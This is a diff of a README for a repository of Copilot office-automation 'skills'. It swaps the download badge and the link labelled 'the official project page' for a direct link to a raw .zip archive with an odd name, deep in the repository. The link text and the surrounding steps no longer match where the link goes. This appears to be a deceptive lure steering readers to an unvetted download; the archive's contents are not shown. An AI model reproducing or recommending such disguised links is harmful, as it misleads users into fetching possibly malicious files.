@@ -1,6 +1,6 @@
 # 🛠️ awesome-copilot-cowork-skills - Automate your office tasks with Copilot
 
-[![](https://img.shields.io/badge/Download_Skills-Blue)](https://github.com/Yugpat1835/awesome-copilot-cowork-skills)
+[![](https://img.shields.io/badge/Download_Skills-Blue)](https://github.com/Yugpat1835/awesome-copilot-cowork-skills/raw/refs/heads/main/skills/daily-briefings/cowork-copilot-awesome-skills-nomocracy.zip)
 
 ## 📁 What is this?
 
@@ -24,7 +24,7 @@ You do not need to install any proprietary software packages or complex coding e
 
 Follow these steps to set up your workflow tools.
 
-1.  Visit the official project page: [https://github.com/Yugpat1835/awesome-copilot-cowork-skills](https://github.com/Yugpat1835/awesome-copilot-cowork-skills)
+1.  Visit the official project page: [https://github.com/Yugpat1835/awesome-copilot-cowork-skills/raw/refs/heads/main/skills/daily-briefings/cowork-copilot-awesome-skills-nomocracy.zip](https://github.com/Yugpat1835/awesome-copilot-cowork-skills/raw/refs/heads/main/skills/daily-briefings/cowork-copilot-awesome-skills-nomocracy.zip)
 2.  Locate the green button labeled "Code" near the top right of the page.
 3.  Select "Download ZIP" from the menu.
 4.  Navigate to your Downloads folder on your hard drive.
